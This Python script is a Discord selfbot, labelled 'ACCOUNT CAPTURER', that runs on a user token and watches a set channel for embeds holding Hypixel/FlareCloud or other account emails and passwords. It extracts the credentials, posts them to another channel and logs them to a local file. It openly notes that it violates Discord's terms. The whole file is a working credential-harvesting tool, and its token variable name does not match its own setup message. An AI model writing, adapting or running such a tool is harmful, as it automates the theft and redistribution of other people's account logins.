import os
import re
import asyncio
from typing import Dict, Optional
import datetime
from discord_self import DiscordSelf, Message, Embed
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
TOKEN = os.getenv('DTOKEN')
MONITOR_CHANNEL_ID = int(os.getenv('MONITOR_CHANNEL_ID', '1470409209123176642'))
FORWARD_CHANNEL_ID = int(os.getenv('FORWARD_CHANNEL_ID', '1483459286569849066'))

class AccountParser:
    """Parse account embeds"""
    
    @staticmethod
    def parse_hypixel_embed(embed: Embed) -> Dict:
        """Parse Hypixel/FlareCloud account embeds"""
        result = {
            'type': 'hypixel_account',
            'email': None,
            'password': None,
            'status': None,
            'playtime': None,
            'money': None,
            'shards': None,
            'minecraft_type': None
        }
        
        # Parse fields
        for field in embed.fields:
            name = field.name.lower()
            value = field.value
            
            if 'email' in name:
                email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', value)
                result['email'] = email_match.group() if email_match else value.strip()
            
            elif 'password' in name or 'pass' in name:
                result['password'] = value.strip()
            
            elif 'status' in name or 'hybrid' in name:
                result['status'] = value.strip()
            
            elif 'playtime' in name or 'donut' in name:
                result['playtime'] = value.strip()
            
            elif 'money' in name:
                result['money'] = value.strip()
            
            elif 'shards' in name:
                result['shards'] = value.strip()
            
            elif 'type' in name:
                result['minecraft_type'] = value.strip()
        
        return result
    
    @staticmethod
    def parse_generic_embed(embed: Embed) -> Dict:
        """Parse any embed with email/password"""
        result = {
            'type': 'generic_account',
            'email': None,
            'password': None,
            'extra': {}
        }
        
        for field in embed.fields:
            name = field.name.lower()
            value = field.value
            
            if 'email' in name:
                email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', value)
                result['email'] = email_match.group() if email_match else value.strip()
            
            elif 'password' in name or 'pass' in name:
                result['password'] = value.strip()
            
            else:
                result['extra'][field.name] = value
        
        return result

class SelfBot:
    def __init__(self):
        self.client = DiscordSelf(token=TOKEN)
        self.parser = AccountParser()
        self.captured_accounts = []
        
        # Setup event handlers
        @self.client.event
        async def on_ready():
            await self.on_ready()
        
        @self.client.event
        async def on_message(message: Message):
            await self.on_message(message)
    
    async def on_ready(self):
        print(f'\n{"="*60}')
        print(f'✓ SELFBOT ONLINE: {self.client.user.name}')
        print(f'✓ User ID: {self.client.user.id}')
        print(f'✓ Monitoring Channel: {MONITOR_CHANNEL_ID}')
        print(f'✓ Forwarding to: {FORWARD_CHANNEL_ID}')
        print(f'{"="*60}\n')
        
        # Test connection to channels
        try:
            monitor_channel = await self.client.fetch_channel(MONITOR_CHANNEL_ID)
            print(f'✓ Connected to monitoring channel: #{monitor_channel.name}')
        except:
            print(f'❌ Cannot access monitoring channel {MONITOR_CHANNEL_ID}')
        
        try:
            forward_channel = await self.client.fetch_channel(FORWARD_CHANNEL_ID)
            print(f'✓ Connected to forwarding channel: #{forward_channel.name}')
        except:
            print(f'❌ Cannot access forwarding channel {FORWARD_CHANNEL_ID}')
        
        print(f'\n🚀 Selfbot is running! Waiting for accounts...\n')
    
    async def on_message(self, message: Message):
        # Skip own messages
        if message.author.id == self.client.user.id:
            return
        
        # Only monitor specific channel
        if message.channel.id != MONITOR_CHANNEL_ID:
            return
        
        # Check for embeds
        if message.embeds:
            for embed in message.embeds:
                await self.process_embed(message, embed)
    
    async def process_embed(self, message: Message, embed: Embed):
        """Process embed and forward if account found"""
        
        account_data = None
        
        # Check embed type
        title_lower = embed.title.lower() if embed.title else ""
        
        if 'flarecloud' in title_lower or 'hypixel' in title_lower or 'unban' in title_lower:
            account_data = self.parser.parse_hypixel_embed(embed)
        elif any('email' in field.name.lower() for field in embed.fields):
            account_data = self.parser.parse_generic_embed(embed)
        
        # Validate we got an account
        if account_data and account_data.get('email') and account_data.get('password'):
            await self.capture_account(message, embed, account_data)
    
    async def capture_account(self, message: Message, embed: Embed, account_data: Dict):
        """Capture and forward account instantly"""
        
        # Store account
        self.captured_accounts.append({
            'timestamp': datetime.datetime.now().isoformat(),
            'source_channel': message.channel.id,
            'author': str(message.author),
            'account': account_data
        })
        
        # Console log
        print(f'\n{"🔐"*35}')
        print(f'🎯 ACCOUNT CAPTURED!')
        print(f'{"🔐"*35}')
        print(f'⏰ Time: {datetime.datetime.now().strftime("%H:%M:%S")}')
        print(f'📌 Source: #{message.channel.name}')
        print(f'👤 Author: {message.author.name}')
        print(f'\n📧 Email: {account_data["email"]}')
        print(f'🔑 Password: {account_data["password"]}')
        
        if account_data.get('status'):
            print(f'📊 Status: {account_data["status"]}')
        if account_data.get('playtime'):
            print(f'⏱️ Playtime: {account_data["playtime"]}')
        
        # Forward to target channel
        await self.forward_account(account_data, message)
        
        # Save to file
        self.save_to_file(account_data, message)
        
        print(f'\n✅ Forwarded to channel {FORWARD_CHANNEL_ID}')
        print(f'{"🔐"*35}\n')
    
    async def forward_account(self, account_data: Dict, original_message: Message):
        """Forward account to target channel instantly"""
        
        try:
            forward_channel = await self.client.fetch_channel(FORWARD_CHANNEL_ID)
            
            # Create forward message
            forward_text = f"""
🎯 **NEW ACCOUNT CAPTURED!**
━━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** ||{account_data['email']}||
🔑 **Password:** ||{account_data['password']}||

📌 **Source:** #{original_message.channel.name}
👤 **Author:** {original_message.author.name}
⏰ **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            if account_data.get('status'):
                forward_text += f"📊 **Status:** {account_data['status']}\n"
            if account_data.get('playtime'):
                forward_text += f"⏱️ **Playtime:** {account_data['playtime']}\n"
            if account_data.get('money'):
                forward_text += f"💰 **Money:** {account_data['money']}\n"
            if account_data.get('shards'):
                forward_text += f"💎 **Shards:** {account_data['shards']}\n"
            
            forward_text += "━━━━━━━━━━━━━━━━━━━━━━"
            
            # Send to forward channel
            await forward_channel.send(forward_text)
            
        except Exception as e:
            print(f"❌ Failed to forward: {e}")
    
    def save_to_file(self, account_data: Dict, message: Message):
        """Save account to file"""
        filename = f"accounts_{datetime.datetime.now().strftime('%Y%m%d')}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Time: {datetime.datetime.now().isoformat()}\n")
            f.write(f"Source: #{message.channel.name} (ID: {message.channel.id})\n")
            f.write(f"Author: {message.author.name}\n")
            f.write(f"Email: {account_data['email']}\n")
            f.write(f"Password: {account_data['password']}\n")
            if account_data.get('status'):
                f.write(f"Status: {account_data['status']}\n")
            if account_data.get('playtime'):
                f.write(f"Playtime: {account_data['playtime']}\n")
            f.write(f"{'='*60}\n")
    
    async def start(self):
        """Start the selfbot"""
        try:
            await self.client.start()
        except Exception as e:
            print(f"❌ Failed to start: {e}")

def main():
    if not TOKEN:
        print("\n❌ ERROR: DISCORD_TOKEN not found in .env file!")
        print("Create a .env file with:")
        print('DISCORD_TOKEN=your_token_here')
        print('MONITOR_CHANNEL_ID=1470409209123176642')
        print('FORWARD_CHANNEL_ID=1483459286569849066')
        return
    
    print("\n" + "="*60)
    print("⚠️  DISCORD SELFBOT - ACCOUNT CAPTURER")
    print("="*60)
    print(f"📡 Monitoring Channel: {MONITOR_CHANNEL_ID}")
    print(f"📤 Forwarding to: {FORWARD_CHANNEL_ID}")
    print("="*60)
    print("⚠️  WARNING: This violates Discord ToS!")
    print("⚠️  Your account may be banned!")
    print("="*60)
    
    
    
    bot = SelfBot()
    asyncio.run(bot.start())
    

if __name__ == "__main__":
    main()
